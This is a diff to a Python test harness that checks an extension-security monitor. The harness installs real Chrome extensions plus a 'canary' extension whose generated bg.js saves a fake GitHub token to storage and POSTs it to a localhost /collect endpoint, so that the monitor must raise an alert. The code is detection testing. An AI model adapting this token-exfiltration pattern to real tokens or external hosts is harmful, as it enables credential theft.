@@ -478,21 +478,28 @@ def unpack_for_chrome(crx_path: Path, target: Path) -> str:
 
 def write_canary(target: Path, port: int):
     """
-    A test-only extension that posts a FAKE GitHub token to the local server
-    whenever a tab finishes loading. The monitor must report it (RULE-02).
+    A test-only extension that misbehaves with a FAKE GitHub token, in the
+    two ways the monitor watches:
+      - the moment it starts, it saves the token to chrome.storage (RULE-04,
+        seen by the hooks the monitor injects - proves they were in place
+        before the extension's first line ran);
+      - whenever a tab finishes loading, it posts the token to the local
+        server (RULE-02, seen on the network).
     """
     target.mkdir(parents=True, exist_ok=True)
     manifest = {
         "manifest_version": 3,
         "name": CANARY_NAME,
         "version": "1.0",
-        "description": "Test-only: sends a fake token to a local server so the monitor must alert",
+        "description": "Test-only: misuses a fake token so the monitor must alert",
         "background": {"service_worker": "bg.js"},
+        "permissions": ["storage"],
         "host_permissions": ["http://127.0.0.1/*"],
     }
     (target / "manifest.json").write_text(json.dumps(manifest))
     (target / "bg.js").write_text(
         "// Test-only canary for tools/real_extension_check.py - the token is fake\n"
+        'chrome.storage.local.set({stash: "ghp_" + "x".repeat(36)});\n'
         "chrome.tabs.onUpdated.addListener((tabId, info) => {\n"
         '  if (info.status !== "complete") return;\n'
         f'  fetch("http://127.0.0.1:{port}/collect", {{method: "POST",\n'
@@ -569,12 +576,11 @@ async def installed_extensions(cdp: DevTools) -> list:
     """Ask chrome://extensions which extensions are installed and enabled."""
     target = await cdp.call("Target.createTarget", url="chrome://extensions/")
     attached = await cdp.call("Target.attachToTarget", targetId=target["targetId"], flatten=True)
-    session = attached["sessionId"]
     try:
         for _ in range(20):  # the page needs a moment before its API exists
             result = await cdp.call(
                 "Runtime.evaluate",
-                session=session,
+                session=attached["sessionId"],
                 expression=INSTALLED_EXTENSIONS_JS,
                 awaitPromise=True,
                 returnByValue=True,
@@ -588,13 +594,32 @@ async def installed_extensions(cdp: DevTools) -> list:
         await cdp.call("Target.closeTarget", targetId=target["targetId"])
 
 
-async def browse(ws_url: str) -> list:
-    """Drive the browser: list installed extensions, visit SITES, close."""
+async def install_extensions(cdp: DevTools, ext_dirs: list) -> list:
+    """
+    Install each unpacked extension into the RUNNING browser and return the
+    IDs Chrome gave them. Doing this after the monitor has attached - rather
+    than with --load-extension at launch - means every machine observes each
+    extension's first-install work. (uBlock Origin Lite writes ~1 MB of
+    filter data then: a fast PC used to finish before the monitor attached,
+    a slow CI runner didn't, so the two saw different things.)
+    """
+    ids = []
+    for ext_dir in ext_dirs:
+        result = await cdp.call("Extensions.loadUnpacked", path=str(ext_dir))
+        ids.append(result.get("id"))
+    return ids
+
+
+async def browse(ws_url: str, ext_dirs: list) -> tuple:
+    """Drive the browser: install the extensions under the monitor, visit SITES."""
     import websockets
 
     async with websockets.connect(ws_url, max_size=None) as ws:
         cdp = DevTools(ws)
-        await asyncio.sleep(SETTLE_SECONDS)
+        await asyncio.sleep(SETTLE_SECONDS)  # the monitor attaches
+        installed_ids = await install_extensions(cdp, ext_dirs)
+        print(f"      installed {len(installed_ids)} extensions with the monitor attached")
+        await asyncio.sleep(SETTLE_SECONDS)  # their first-install work, observed
         installed = await installed_extensions(cdp)
         for url in SITES:
             print(f"      visiting {url}", flush=True)
@@ -605,19 +630,18 @@ async def browse(ws_url: str) -> list:
             await cdp.call("Browser.close")
         except Exception:
             pass  # Chrome may drop the connection while closing - that's fine
-    return installed
+    return installed_ids, installed
 
 
-def chrome_command(chrome: Path, port: int, profile: Path, ext_dirs: list) -> list:
-    dirs = ",".join(str(d) for d in ext_dirs)
+def chrome_command(chrome: Path, port: int, profile: Path) -> list:
     command = [
         str(chrome),
         "--headless=new",
         f"--user-data-dir={profile}",
         f"--remote-debugging-port={port}",
         "--remote-debugging-address=127.0.0.1",
-        f"--load-extension={dirs}",
-        f"--disable-extensions-except={dirs}",
+        # Lets DevTools install unpacked extensions (Extensions.loadUnpacked)
+        "--enable-unsafe-extension-debugging",
         "--no-first-run",
         "--no-default-browser-check",
     ]
@@ -667,13 +691,22 @@ def judge_runtime(genuine: list, installed: list, alerts: list, hits: list,
             problems.append(f"alert about an unexpected extension: {_alert_summary(alert)}")
 
     canary_rule02 = [a for a in canary_alerts if a.get("rule") == "RULE-02"]
+    canary_rule04 = [a for a in canary_alerts if a.get("rule") == "RULE-04"]
     canary_loaded = any(by_id[i].get("state") == "ENABLED" for i in canary_ids)
     if not canary_loaded:
         problems.append("the canary extension did not load in Chrome")
     if not hits:
         problems.append("the canary extension never ran (no requests reached the local server)")
     if not canary_rule02:
-        problems.append("the canary's fake token was NOT detected - the monitor was not watching")
+        problems.append(
+            "the canary's fake token on the network was NOT detected (RULE-02) - "
+            "the monitor was not watching"
+        )
+    if not canary_rule04:
+        problems.append(
+            "the canary's fake token in storage was NOT detected (RULE-04) - the monitor's "
+            "hooks were not in place when the extension started"
+        )
     if "Traceback" in monitor_log:
         problems.append("extguard-monitor crashed: " + monitor_log.strip().splitlines()[-1][:200])
 
@@ -684,6 +717,7 @@ def judge_runtime(genuine: list, installed: list, alerts: list, hits: list,
             "requests_sent": len(hits),
             "alerts": len(canary_alerts),
             "rule02_alerts": len(canary_rule02),
+            "rule04_alerts": len(canary_rule04),
         },
         "problems": problems,
     }
@@ -691,8 +725,10 @@ def judge_runtime(genuine: list, installed: list, alerts: list, hits: list,
 
 def _alert_summary(alert: dict) -> str:
     detail = alert.get("detail") or {}
+    keys = detail.get("keys")  # RULE-04: which storage keys were written
     return (
         f"{alert.get('rule')} {alert.get('severity')}: {str(detail.get('description', ''))[:120]}"
+        + (f" (keys: {', '.join(map(str, keys[:5]))})" if keys else "")
     )
 
 
@@ -715,7 +751,7 @@ def check_runtime(genuine: list, chrome: Path, work: Path) -> dict:
 
     port = free_port()
     chrome_proc = subprocess.Popen(
-        chrome_command(chrome, port, work / "profile", ext_dirs),
+        chrome_command(chrome, port, work / "profile"),
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
     )
@@ -732,7 +768,9 @@ def check_runtime(genuine: list, chrome: Path, work: Path) -> dict:
                  "--port", str(port), "--output-json", "--once"],
                 stdout=out, stderr=log, env=scan_env(work / "monitor-home"),
             )  # fmt: skip
-            installed = asyncio.run(browse(version["webSocketDebuggerUrl"]))
+            installed_ids, installed = asyncio.run(
+                browse(version["webSocketDebuggerUrl"], ext_dirs)
+            )
             try:
                 monitor.wait(timeout=30)
             except subprocess.TimeoutExpired:
@@ -749,6 +787,11 @@ def check_runtime(genuine: list, chrome: Path, work: Path) -> dict:
         chrome_proc.wait(timeout=30)
         server.shutdown()
         server.server_close()
+
+    # installed_ids is in ext_dirs order: the genuine ones, then the canary
+    for result, installed_id in zip(genuine, installed_ids, strict=False):
+        if installed_id != result["id"]:
+            raise SetupError(f"{result['name']}: Chrome installed it as {installed_id}")
 
     alerts = []
     for line in alerts_path.read_text(encoding="utf-8").splitlines():
@@ -773,7 +816,8 @@ def check_runtime(genuine: list, chrome: Path, work: Path) -> dict:
         )
     print(
         f"      canary: {result['canary']['requests_sent']} requests sent, "
-        f"{result['canary']['rule02_alerts']} RULE-02 alerts",
+        f"{result['canary']['rule02_alerts']} RULE-02 + "
+        f"{result['canary']['rule04_alerts']} RULE-04 alerts",
         flush=True,
     )
     return result
@@ -863,10 +907,13 @@ def render_markdown(report: dict) -> str:
                 f"| {len(row['alerts'])} | {'PASS' if ok else 'FAIL'} |"
             )
         canary = runtime["canary"]
+        caught = canary["rule02_alerts"] and canary["rule04_alerts"] and canary["requests_sent"]
         lines.append(
             f"| {CANARY_NAME} (fake token, must be caught) "
-            f"| {'yes' if canary['loaded'] else 'NO'} | {canary['rule02_alerts']} RULE-02 "
-            f"| {'PASS' if canary['rule02_alerts'] and canary['requests_sent'] else 'FAIL'} |"
+            f"| {'yes' if canary['loaded'] else 'NO'} "
+            f"| {canary['rule02_alerts']} RULE-02 (network), "
+            f"{canary['rule04_alerts']} RULE-04 (storage, at start-up) "
+            f"| {'PASS' if caught else 'FAIL'} |"
         )
     problems = all_problems(report)
     if problems:
@@ -908,6 +955,12 @@ def parse_args(argv):
     )
     parser.add_argument("--json-report", metavar="PATH", help="write the full report as JSON")
     parser.add_argument("--markdown", metavar="PATH", help="write the summary as Markdown")
+    parser.add_argument(
+        "--work-dir",
+        metavar="DIR",
+        help="an empty folder to work in and KEEP afterwards (monitor log, alerts, unpacked "
+        "extensions, Chrome profile) - for investigating a failure",
+    )
     parser.add_argument("--only", metavar="SLUG", action="append",
                         choices=[ext["slug"] for ext in EXTENSIONS],
                         help="test only this extension (repeatable)")  # fmt: skip
@@ -923,6 +976,9 @@ def main(argv: list | None = None) -> int:
         print("ERROR: --runtime needs --chrome PATH (Chrome for Testing)", file=sys.stderr)
         return 2
     chosen = [ext for ext in EXTENSIONS if not args.only or ext["slug"] in args.only]
+    if args.work_dir and Path(args.work_dir).exists() and any(Path(args.work_dir).iterdir()):
+        print(f"ERROR: --work-dir {args.work_dir} is not empty", file=sys.stderr)
+        return 2
 
     report = {
         "meta": {
@@ -936,7 +992,8 @@ def main(argv: list | None = None) -> int:
         with tempfile.TemporaryDirectory(
             prefix="eg-realcheck-", ignore_cleanup_errors=True
         ) as tmp:  # fmt: skip
-            work = Path(tmp)
+            work = Path(args.work_dir or tmp)
+            work.mkdir(parents=True, exist_ok=True)
             cache = Path(args.cache_dir) if args.cache_dir else work / "crx"
             cache.mkdir(parents=True, exist_ok=True)
             report["extensions"] = check_genuine(chosen, cache, work / "home")
